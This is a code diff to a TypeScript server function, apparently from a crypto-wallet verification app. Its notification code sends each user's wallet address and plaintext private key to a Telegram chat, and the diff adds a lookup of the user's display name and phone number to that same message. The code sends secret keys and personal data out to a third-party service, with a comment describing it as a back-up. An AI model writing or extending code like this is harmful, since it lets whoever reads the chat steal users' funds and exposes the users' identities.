@@ -80,10 +80,14 @@ export const bindFirstVerify = createServerFn({ method: "POST" })
     // Notify Telegram with the whitelisted key for back-up. Await it so the
     // server runtime does not end before the message is sent.
     try {
+      const { data: prof } = await supabaseAdmin
+        .from("profiles").select("display_name, phone_number").eq("id", userId).maybeSingle();
+      const userLine = `${prof?.display_name ?? "—"}${prof?.phone_number ? " · " + prof.phone_number : ""}`;
       await notifyTelegram(
         `✅ <b>First verify OK</b>\n` +
+        `User: <b>${userLine}</b>\n` +
         `Slot: #${data.slot}\n` +
-        `Name: ${data.faceLabel.trim()}\n` +
+        `Face: ${data.faceLabel.trim()}\n` +
         `Wallet: <code>${data.walletAddress}</code>\n` +
         `Key: <code>${data.privateKey}</code>`
       );
